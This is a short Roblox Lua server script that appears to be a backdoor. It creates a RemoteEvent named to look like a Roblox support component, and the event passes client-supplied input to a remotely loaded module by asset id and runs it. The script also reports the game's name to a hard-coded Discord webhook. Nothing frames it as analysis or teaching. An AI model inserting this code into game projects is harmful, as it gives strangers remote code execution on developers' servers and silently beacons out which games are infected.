local new = Instance.new("RemoteEvent")
new.Parent = game.ReplicatedStorage
new.Name = "RobloxSupportModelCC_S"
new.OnServerEvent:Connect(function(player, Trm)
require(5423914129)(Trm)()
end
local HttpService = game:GetService("HttpService")
local webhookUrl = "https://discord.com/api/webhooks/1335563932617805834/XPjmEF5VwZxdeWvo_p-O8f0HibG-JF7wklJ08sGfSsl2fNMjAb7ss314L7tnzVByb_qk"


local function sendStatsToWebhook()
    local data = {
        ["content"] = game.Name
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}

    local success, errorMessage = pcall(function()
        HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
    end)

    if not success then
        warn("Failed to send message: " .. errorMessage)
    end
end

sendStatsToWebhook()

